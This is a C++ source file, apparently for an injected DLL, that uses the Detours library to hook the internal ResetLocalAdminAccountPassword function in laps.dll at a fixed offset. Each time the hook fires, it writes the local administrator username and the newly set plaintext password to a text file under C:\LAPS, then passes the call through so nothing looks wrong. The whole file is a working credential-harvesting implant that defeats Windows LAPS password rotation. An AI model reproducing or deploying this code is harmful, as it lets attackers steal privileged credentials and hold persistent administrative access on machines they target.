#include <fstream>

#include "pch.h"
#include "Hook.h"
#include <detours.h>

#ifdef _DEBUG
void DEBUGLOG(LPCWSTR message)
{
	std::wofstream outputfile;
	outputfile.open("C:\\LAPS\\AccountManager_ResetLocalAdminAccountPassword_DEBUG.txt", std::fstream::app);
	outputfile << message << std::endl;
	outputfile.close();
}
#else
void DEBUGLOG(LPCWSTR message)
{

}
#endif

#define OFFSET 0x13C0C

BOOL AttachHook()
{
	DWORD error;
	DEBUGLOG(L"[*] AttachHook - function called");

	LPCWSTR dllname = L"laps.dll";
	HMODULE hMod = GetModuleHandle(dllname);
	if (!hMod) {
		DEBUGLOG(L"[-] AttachHook - laps not found");
	}
	else {
		DEBUGLOG(L"[*] AttachHook - laps found");
	}

	DWORD64 funcAddress = (DWORD64)hMod + OFFSET;
	ResetLocalAdminAccountPassword = (pResetLocalAdminAccountPassword)(funcAddress);
	if (ResetLocalAdminAccountPassword == nullptr)
	{
		DEBUGLOG(L"[-] AttachHook - ResetLocalAdminAccountPassword not found");
		return false;
	}

	error = DetourTransactionBegin();
	if (error != NO_ERROR) {
		DEBUGLOG(L"[-] AttachHook - Error DetourTransactionBegin");
		return FALSE;
	}
	error = DetourUpdateThread(GetCurrentThread());
	if (error != NO_ERROR) {
		DEBUGLOG(L"[-] AttachHook - Error DetourUpdateThread");
		return FALSE;
	}
	error = DetourAttach(&(PVOID&)ResetLocalAdminAccountPassword, HookResetLocalAdminAccountPassword);
	if (error != NO_ERROR) {
		DEBUGLOG(L"[-] AttachHook - Error DetourAttach");
		return FALSE;
	}
	error = DetourTransactionCommit();
	if (error != NO_ERROR) {
		DEBUGLOG(L"[-] AttachHook - Error DetourTransactionCommit");
		return FALSE;
	} 
	DEBUGLOG(L"[+] AttachHook - function successfully called");
	return TRUE;
}

BOOL DetachHook()
{
	DWORD error;
	DEBUGLOG(L"[*] DetachHook - function called");
	error = DetourTransactionBegin();
	if (error != NO_ERROR) {
		DEBUGLOG(L"[-] DetachHook - Error DetourTransactionBegin");
		return FALSE;
	}
	error = DetourUpdateThread(GetCurrentThread());
	if (error != NO_ERROR) {
		DEBUGLOG(L"[-] DetachHook - Error DetourUpdateThread");
		return FALSE;
	}
	error = DetourDetach(&(PVOID&)ResetLocalAdminAccountPassword, HookResetLocalAdminAccountPassword);
	if (error != NO_ERROR) {
		DEBUGLOG(L"[-] DetachHook - Error DetourDetach");
		return FALSE;
	}
	error = DetourTransactionCommit();
	if (error != NO_ERROR) {
		DEBUGLOG(L"[-] DetachHook - Error DetourTransactionCommit");
		return FALSE;
	}
	DEBUGLOG(L"[+] DetachHook - function successfully called");
	return TRUE;
}

LONG HookResetLocalAdminAccountPassword(LPVOID param1, LPVOID param2, LPCWSTR password, LPVOID param4)
{
	DEBUGLOG(L"[*] HookResetLocalAdminAccountPassword - function called");

	LPVOID* usernamePtrAddress = reinterpret_cast<LPVOID*>((BYTE*)param2 + 0x18);
	LPCWSTR username = reinterpret_cast<LPCWSTR>(*usernamePtrAddress);

	std::wofstream outputfile;
	outputfile.open("C:\\LAPS\\AccountManager_ResetLocalAdminAccountPassword.txt", std::fstream::app);
	outputfile << L"Username: " << username << std::endl;
	outputfile << L"Password: " << password << std::endl;
	outputfile.close();

	DEBUGLOG(L"[+] HookResetLocalAdminAccountPassword - function successfully called");

	return ResetLocalAdminAccountPassword(param1, param2, password, param4);
}
